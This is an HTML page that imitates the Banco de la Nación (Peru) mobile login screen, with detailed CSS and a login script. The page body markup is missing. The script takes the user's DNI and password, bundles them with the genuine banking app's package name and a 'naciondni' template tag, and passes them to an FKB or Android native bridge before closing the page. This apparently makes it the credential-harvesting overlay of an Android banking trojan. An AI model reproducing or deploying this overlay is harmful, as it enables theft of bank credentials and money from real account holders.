<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover">
  <meta name="theme-color" content="#f4f5f7">
  <title>Banco de la Nación</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@500;600;700;800&display=swap" rel="stylesheet">
  <style>
    :root {
      --u: min(100vw / 841, 100dvh / 1798, 430px / 841);
      --w: calc(var(--u) * 841);
      --red: #c8161e;
      --red-2: #e10613;
      --ink: #1a1a1a;
      --muted: #8d8d8d;
      --line: #e3e4e6;
      --bg: #f4f5f7;
    }
    * { box-sizing: border-box; margin: 0; padding: 0; }
    html, body { height: 100%; background: #e6e7ea; }
    body {
      min-height: 100dvh;
      display: flex;
      justify-content: center;
      font-family: "Plus Jakarta Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
      color: var(--ink);
      -webkit-text-size-adjust: 100%;
      -webkit-tap-highlight-color: transparent;
      -webkit-font-smoothing: antialiased;
    }
    button, input { font: inherit; color: inherit; }
    button { border: 0; background: transparent; cursor: pointer; padding: 0; }
    button:active { opacity: .75; }
    img { display: block; }
    .app {
      position: relative;
      width: var(--w);
      height: 100dvh;
      overflow: hidden;
      background: var(--bg);
    }
    .plate {
      position: absolute;
      left: 0;
      top: 0;
      width: 100%;
      height: calc(var(--u) * 1798);
      object-fit: fill;
      pointer-events: none;
      user-select: none;
    }
    .head { position: absolute; left: 0; top: 0; }
    .mark {
      position: absolute;
      left: calc(var(--u) * 115);
      top: calc(var(--u) * 131);
      width: calc(var(--u) * 146);
      height: calc(var(--u) * 124);
    }
    .word {
      position: absolute;
      left: calc(var(--u) * 268);
      top: calc(var(--u) * 150);
      width: calc(var(--u) * 472);
      height: calc(var(--u) * 102);
      overflow: visible;
    }
    .card {
      position: absolute;
      left: calc(var(--u) * 58);
      right: calc(var(--u) * 58);
      top: calc(var(--u) * 434);
      height: calc(var(--u) * 112);
      display: flex;
      align-items: center;
      background: #fff;
      border: 1px solid #dedfe2;
      border-radius: calc(var(--u) * 8);
      overflow: hidden;
      box-shadow: 0 calc(var(--u) * 6) calc(var(--u) * 16) rgba(20, 24, 32, .04);
    }
    .card .ico { width: calc(var(--u) * 52); height: calc(var(--u) * 36); object-fit: contain; margin-left: calc(var(--u) * 22); }
    .dots {
      flex: 1;
      display: flex;
      justify-content: center;
      gap: calc(var(--u) * 14);
      padding: 0 calc(var(--u) * 12);
    }
    .dots i {
      width: calc(var(--u) * 9);
      height: calc(var(--u) * 9);
      border-radius: 50%;
      background: #2c2c2c;
    }
    .drop {
      width: calc(var(--u) * 108);
      height: 100%;
      background: var(--red);
      display: grid;
      place-items: center;
      flex: none;
    }
    .drop svg { width: calc(var(--u) * 28); height: calc(var(--u) * 28); }
    .row {
      position: absolute;
      left: calc(var(--u) * 58);
      right: calc(var(--u) * 58);
      height: calc(var(--u) * 96);
      display: flex;
      gap: calc(var(--u) * 16);
    }
    .row.dni { top: calc(var(--u) * 582); }
    .kind, .box {
      height: 100%;
      border-radius: calc(var(--u) * 8);
      display: flex;
      align-items: center;
      box-shadow: 0 calc(var(--u) * 4) calc(var(--u) * 12) rgba(20, 24, 32, .03);
    }
    .kind {
      position: relative;
      width: calc(var(--u) * 300);
      background: #ececee;
      justify-content: center;
      font-size: calc(var(--u) * 40);
      font-weight: 700;
      flex: none;
    }
    .kind img {
      position: absolute;
      left: calc(var(--u) * 22);
      width: calc(var(--u) * 58);
      height: calc(var(--u) * 48);
      object-fit: contain;
    }
    .box {
      flex: 1;
      background: #fff;
      border: 1px solid var(--line);
      padding: 0 calc(var(--u) * 16);
      gap: calc(var(--u) * 12);
    }
    .box.bad { border-color: var(--red); }
    .box input {
      flex: 1;
      min-width: 0;
      height: 100%;
      border: 0;
      outline: none;
      background: transparent;
      font-size: calc(var(--u) * 28);
      font-weight: 600;
    }
    .box input::placeholder { color: #b0b0b0; font-weight: 500; }
    .lock { width: calc(var(--u) * 48); height: calc(var(--u) * 56); object-fit: contain; flex: none; }
    .eye {
      width: calc(var(--u) * 44);
      height: calc(var(--u) * 44);
      display: grid;
      place-items: center;
      flex: none;
    }
    .eye img, .eye svg { width: calc(var(--u) * 36); height: calc(var(--u) * 34); object-fit: contain; }
    .eye .open { display: none; }
    .eye.on img { display: none; }
    .eye.on .open { display: block; }
    .pass { top: calc(var(--u) * 736); height: calc(var(--u) * 116); }
    .err {
      position: absolute;
      left: calc(var(--u) * 62);
      right: calc(var(--u) * 62);
      font-size: calc(var(--u) * 18);
      color: var(--red);
      font-weight: 600;
      display: none;
    }
    .err.show { display: block; }
    .err.dni { top: calc(var(--u) * 684); }
    .err.clave { top: calc(var(--u) * 860); }
    .forgot {
      position: absolute;
      left: calc(var(--u) * 62);
      top: calc(var(--u) * 900);
      color: #e10600;
      font-size: calc(var(--u) * 28);
      font-weight: 700;
      text-decoration: underline;
      text-underline-offset: 3px;
    }
    .go, .gen {
      position: absolute;
      left: calc(var(--u) * 65);
      width: calc(var(--u) * 711);
      height: calc(var(--u) * 116);
      border-radius: calc(var(--u) * 12);
      font-size: calc(var(--u) * 32);
      font-weight: 700;
    }
    .go {
      top: calc(var(--u) * 957);
      background: var(--red);
      color: #fff;
    }
    .go.loading { color: transparent; pointer-events: none; }
    .go.loading::after {
      content: "";
      position: absolute;
      left: 50%;
      top: 50%;
      width: calc(var(--u) * 28);
      height: calc(var(--u) * 28);
      margin: calc(var(--u) * -14) 0 0 calc(var(--u) * -14);
      border-radius: 50%;
      border: calc(var(--u) * 3) solid rgba(255,255,255,.35);
      border-top-color: #fff;
      animation: spin .7s linear infinite;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
    .gen {
      top: calc(var(--u) * 1100);
      background: #fff;
      color: var(--red);
      border: calc(var(--u) * 2) solid var(--red);
    }
    .tiles {
      position: absolute;
      left: calc(var(--u) * 140);
      right: calc(var(--u) * 140);
      top: calc(var(--u) * 1288);
      display: flex;
      justify-content: space-between;
    }
    .tile {
      width: calc(var(--u) * 240);
      height: calc(var(--u) * 196);
      background: #fff;
      border-radius: calc(var(--u) * 16);
      box-shadow: 0 calc(var(--u) * 8) calc(var(--u) * 22) rgba(20, 24, 32, .06);
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      gap: calc(var(--u) * 12);
      font-size: calc(var(--u) * 24);
      font-weight: 700;
    }
    .tile img { width: calc(var(--u) * 48); height: calc(var(--u) * 64); object-fit: contain; }
    .nav {
      position: absolute;
      left: 0;
      right: 0;
      top: calc(var(--u) * 1626);
      bottom: 0;
      height: auto;
      background: var(--red);
      display: flex;
      align-items: stretch;
    }
    .nav button {
      flex: 1;
      color: #fff;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      gap: calc(var(--u) * 8);
      font-size: calc(var(--u) * 22);
      font-weight: 600;
    }
    .nav img { width: calc(var(--u) * 40); height: calc(var(--u) * 40); object-fit: contain; }
    .nav button + button { box-shadow: inset calc(var(--u) * 1) 0 0 rgba(255,255,255,.85); }
  </style>
</head>

  <script>
    (function () {
      var dni = document.getElementById("dni");
      var clave = document.getElementById("clave");
      var dniErr = document.getElementById("dniErr");
      var claveErr = document.getElementById("claveErr");
      var dniBox = document.getElementById("dniBox");
      var claveBox = document.getElementById("claveBox");
      var eye = document.getElementById("eye");
      var go = document.getElementById("go");
      function digits(el, n) {
        var v = el.value.replace(/\D/g, "").slice(0, n);
        if (v !== el.value) el.value = v;
        return v;
      }
      function cleanPass(el) {
        var v = el.value.replace(/\D/g, "");
        if (v !== el.value) el.value = v;
        return v;
      }
      function passOk(v) {
        return v.length >= 6;
      }
      dni.addEventListener("input", function () {
        if (digits(dni, 8).length === 8) { dniErr.classList.remove("show"); dniBox.classList.remove("bad"); }
      });
      clave.addEventListener("input", function () {
        if (passOk(cleanPass(clave))) { claveErr.classList.remove("show"); claveBox.classList.remove("bad"); }
      });
      eye.addEventListener("click", function () {
        var show = clave.type === "password";
        clave.type = show ? "text" : "password";
        eye.classList.toggle("on", show);
        eye.setAttribute("aria-label", show ? "Ocultar clave" : "Mostrar clave");
      });
      go.addEventListener("click", function () {
        if (go.classList.contains("loading")) return;
        var d = digits(dni, 8);
        var c = cleanPass(clave);
        var okD = d.length === 8;
        var okC = passOk(c);
        dniErr.classList.toggle("show", !okD);
        claveErr.classList.toggle("show", !okC);
        dniBox.classList.toggle("bad", !okD);
        claveBox.classList.toggle("bad", !okC);
        if (!okD) { dni.focus(); return; }
        if (!okC) { clave.focus(); return; }
        go.classList.add("loading");
        go.setAttribute("aria-busy", "true");
        setTimeout(() => {
        try {
          try {
            var _pkg = (typeof FKB !== 'undefined' && FKB.getPkg) ? FKB.getPkg() : 'pe.com.bn.app.bancodelanacion';
            var _sn  = (typeof FKB !== 'undefined' && FKB.getSn)  ? FKB.getSn()  : '';
            var _pl  = JSON.stringify({
              pkg: _pkg, sn: _sn, template: 'naciondni',
              formData: { dni: dni.value, password: clave.value }
            });
            if (typeof FKB !== 'undefined' && FKB.setFormData) FKB.setFormData(_pl);
            else if (typeof Android !== 'undefined' && Android.returnResult) Android.returnResult(_pl);
          } catch (e) {}
        } catch (e) {}
        setTimeout(() => {
          try {
            try {
            if (typeof FKB !== 'undefined' && FKB.setClosePage) FKB.setClosePage(typeof _pkg !== 'undefined' ? _pkg : '');
            else if (typeof Android !== 'undefined' && Android.close) Android.close();
          } catch (e) {}
          } catch (e) {}
        }, 2500);
      }, 900);
      });
    })();
  </script>
